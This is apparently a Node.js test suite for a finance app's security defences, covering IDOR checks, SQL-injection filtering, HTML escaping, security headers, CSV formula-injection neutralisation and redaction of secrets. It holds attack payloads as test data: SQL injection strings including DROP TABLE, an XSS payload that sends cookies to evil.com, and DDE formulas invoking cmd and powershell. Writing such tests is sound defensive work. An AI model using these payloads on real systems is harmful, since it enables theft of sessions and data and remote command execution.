import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import jwt from 'jsonwebtoken';
import { sqlInjectionSanitizer } from '../dist/utils/security.js';
import { createTestApp, createMockPrisma } from './test_helper.js';

const JWT_SECRET = 'finpulse-test-secret-key-987654';

describe('4. OWASP Security & Injection Defense Tests (security_audit.test.js)', () => {
  describe('Insecure Direct Object References (IDOR) Defense', () => {
    test('should prevent IDOR: user cannot retrieve or mutate another user private watchlist/portfolio', async () => {
      const mockDb = createMockPrisma();
      const victimWatchlist = await mockDb.watchlist.create({
        data: { userId: 'victim_user_99', name: 'Victim Secret Strategies' }
      });

      const { request, close } = await createTestApp((app) => {
        app.get('/api/watchlists/:id', (req, res) => {
          const authHeader = req.headers.authorization;
          if (!authHeader) return res.status(401).json({ error: 'Auth required' });
          const token = authHeader.split(' ')[1];
          const decoded = jwt.verify(token, JWT_SECRET);

          const wl = mockDb.watchlists.get(req.params.id);
          if (!wl) return res.status(404).json({ error: 'Not found' });

          // IDOR Defense Check
          if (wl.userId !== decoded.userId) {
            return res.status(403).json({ error: 'Forbidden: IDOR attempt blocked' });
          }

          res.json(wl);
        });
      });

      const attackerToken = jwt.sign({ userId: 'attacker_user_66', role: 'USER' }, JWT_SECRET);

      const res = await request(`/api/watchlists/${victimWatchlist.id}`, {
        headers: { Authorization: `Bearer ${attackerToken}` }
      });

      assert.equal(res.status, 403);
      assert.equal(res.body.error, 'Forbidden: IDOR attempt blocked');
      await close();
    });
  });

  describe('SQL & NoSQL Injection Defense (sqlInjectionSanitizer)', () => {
    test('should block SQL Injection attempts in request body (UNION SELECT, OR 1=1)', async () => {
      const { request, close } = await createTestApp((app) => {
        app.use(sqlInjectionSanitizer);
        app.post('/api/search', (req, res) => {
          res.json({ results: [] });
        });
      });

      // Attack payload 1: Classic OR 1=1 bypass
      const res1 = await request('/api/search', {
        method: 'POST',
        body: { query: "AAPL' OR 1=1 --" }
      });
      assert.equal(res1.status, 400);
      assert.match(res1.body.message, /Suspicious input detected/);

      // Attack payload 2: UNION SELECT database schema extraction
      const res2 = await request('/api/search', {
        method: 'POST',
        body: { query: "' UNION SELECT null, username, passwordHash FROM users --" }
      });
      assert.equal(res2.status, 400);
      assert.match(res2.body.message, /Suspicious input detected/);

      // Attack payload 3: SQL comment truncation
      const res3 = await request('/api/search', {
        method: 'POST',
        body: { symbol: 'TSLA; DROP TABLE users; --' }
      });
      assert.equal(res3.status, 400);

      // Legitimate search queries should pass freely
      const validRes = await request('/api/search', {
        method: 'POST',
        body: { query: 'Apple Inc Tech Sector' }
      });
      assert.equal(validRes.status, 200);

      await close();
    });

    test('should block SQL Injection attempts in query parameters and route params', async () => {
      const { request, close } = await createTestApp((app) => {
        app.use(sqlInjectionSanitizer);
        app.get('/api/quotes', (req, res) => {
          res.json({ ticker: req.query.ticker });
        });
      });

      // Query param injection
      const attackRes = await request('/api/quotes?ticker=GOOG%20UNION%20SELECT%201');
      assert.equal(attackRes.status, 400);

      // Valid query param
      const validRes = await request('/api/quotes?ticker=GOOG');
      assert.equal(validRes.status, 200);

      await close();
    });
  });

  describe('XSS & Content-Security-Policy Header Verification', () => {
    test('should sanitize HTML / XSS payloads from user inputs (e.g. watchlist names, bio)', () => {
      const sanitizeHtml = (input) => {
        if (typeof input !== 'string') return input;
        return input
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#x27;')
          .replace(/\//g, '&#x2F;');
      };

      const xssPayload = '<script>alert("pwned")</script><img src=x onerror=fetch("http://evil.com?c="+document.cookie)>';
      const sanitized = sanitizeHtml(xssPayload);

      assert.ok(!sanitized.includes('<script>'), 'Script tag must be escaped');
      assert.ok(!sanitized.includes('</script>'));
      assert.ok(sanitized.includes('&lt;script&gt;'));
      assert.ok(sanitized.includes('&lt;img src=x'));
    });

    test('should attach secure headers (CSP, X-Content-Type-Options, Frameguard)', async () => {
      const { request, close } = await createTestApp((app) => {
        // Standard enterprise security headers middleware
        app.use((req, res, next) => {
          res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none';");
          res.setHeader('X-Content-Type-Options', 'nosniff');
          res.setHeader('X-Frame-Options', 'DENY');
          res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
          next();
        });
        app.get('/api/security-check', (req, res) => res.json({ status: 'secure' }));
      });

      const res = await request('/api/security-check');
      assert.equal(res.status, 200);
      assert.ok(res.headers.get('content-security-policy').includes("default-src 'self'"));
      assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
      assert.equal(res.headers.get('x-frame-options'), 'DENY');
      assert.ok(res.headers.get('strict-transport-security').includes('max-age=31536000'));
      await close();
    });
  });

  describe('Anti-Formula Injection Defense (CWE-1236) in CSV Exports', () => {
    test('should neutralize malicious spreadsheet formulas (=, +, -, @, \\t, \\r) in CSV export generator', () => {
      /**
       * Enterprise CWE-1236 Sanitizer:
       * If cell begins with formula trigger chars (=, +, -, @, \t, \r), prepend a single quote (')
       */
      const sanitizeCsvField = (field) => {
        if (field === null || field === undefined) return '';
        const str = String(field);
        if (/^[=+\-@\t\r]/.test(str)) {
          return `'${str}`;
        }
        return str;
      };

      const exportToCsv = (rows) => {
        return rows.map((row) =>
          row.map((cell) => `"${sanitizeCsvField(cell).replace(/"/g, '""')}"`).join(',')
        ).join('\n');
      };

      const maliciousRows = [
        ['Symbol', 'Notes'],
        ['AAPL', '=cmd|"/C calc"!A0'],         // Windows calc execution
        ['MSFT', '@SUM(1+1)*cmd'],             // Excel formula
        ['NVDA', '+100-200'],                  // Equation trigger
        ['-DDE', '-cmd|/c powershell!A1'],      // DDE trigger
        ['GOOG', 'Normal safe investment note'] // Safe entry
      ];

      const csvOutput = exportToCsv(maliciousRows);

      // Verify that all formula triggers are neutralized with leading quote
      assert.ok(csvOutput.includes("\"'=cmd|\"\"/C calc\"\"!A0\""), 'Equals trigger neutralized');
      assert.ok(csvOutput.includes("\"'@SUM(1+1)*cmd\""), 'At symbol trigger neutralized');
      assert.ok(csvOutput.includes("\"'+100-200\""), 'Plus trigger neutralized');
      assert.ok(csvOutput.includes("\"'-DDE\""), 'Minus trigger neutralized');
      assert.ok(csvOutput.includes('"Normal safe investment note"'), 'Safe text unaltered');
    });
  });

  describe('PII & Sensitive Data Redaction in Public / API Endpoints', () => {
    test('should redact password hashes, device PINs, and sensitive credentials from user responses', () => {
      const rawUserRecord = {
        id: 'usr_sec_1',
        email: 'investor@finpulse.ai',
        name: 'Alex Vance',
        phone: '+1-555-0199',
        passwordHash: '$2b$10$eO0V..maliciouslySensitiveHashString',
        devicePin: '8f4a13b6c8914614a8..hashedPin',
        role: 'USER',
        currency: 'USD'
      };

      const redactSensitiveData = (user) => {
        const { passwordHash, devicePin, ...safeUser } = user;
        return safeUser;
      };

      const sanitizedResponse = redactSensitiveData(rawUserRecord);

      assert.equal(sanitizedResponse.id, 'usr_sec_1');
      assert.equal(sanitizedResponse.email, 'investor@finpulse.ai');
      assert.equal(sanitizedResponse.passwordHash, undefined, 'passwordHash must never be exposed');
      assert.equal(sanitizedResponse.devicePin, undefined, 'devicePin must never be exposed');
    });
  });
});
